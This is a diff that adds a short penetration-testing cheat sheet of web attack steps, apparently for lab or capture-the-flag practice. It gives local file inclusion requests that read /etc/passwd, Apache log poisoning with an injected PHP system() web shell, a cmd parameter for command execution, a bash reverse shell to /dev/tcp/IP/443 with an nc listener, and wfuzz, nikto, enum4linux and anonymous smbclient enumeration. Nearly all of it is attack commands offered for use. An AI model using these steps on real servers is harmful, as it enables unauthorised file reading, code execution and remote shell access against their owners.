@@ -1,0 +1,46 @@
+Manual inspections (Source code Analysis)
+wfuzz, directory brutefore, Files checking,nikto, Parameter testing
+
+http://ip/index.php?book=list
+http://ip/index.php?book=../../../../etc/passwd
+
+LFI
+http://ip/index.php?book=../../../../var/www/html/index.php
+http://ip/index.php?book=../../../../var/log/apache2/access.log
+
+Poison the log file with executable code
+
+nc -nv IP 80
+
+GET /<?php system($_GET['cmd']); ?>  --> get the bad request, dont worry about that, reload the logs in webpage once again, we can see the GET method in the logs.
+
+http://ip/index.php?book=../../../../var/log/apache2/access.log&cmd=id
+Revershell wrapped 
+bash -c 'bash -i >& /dev/tcp/IP/443 0>&1'
+
+URL encodeing
+meyerweb.com
+
+nc -nlvp 443
+
+export URL="http://IP:port/FUZZ"
+wfuzz
+Checking the files
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 "$URL"
+Checking the directories
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 "$URL"
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404,302 "$URL"
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 --hh 0 "$URL" --> work perfect
+
+Nikto
+nikto --host url -C all
+
+Enum4linux
+
+enum4linux -A IP
+
+SMB
+smbclient //'192.168.235.76'/sambashare -N
+
+
+	
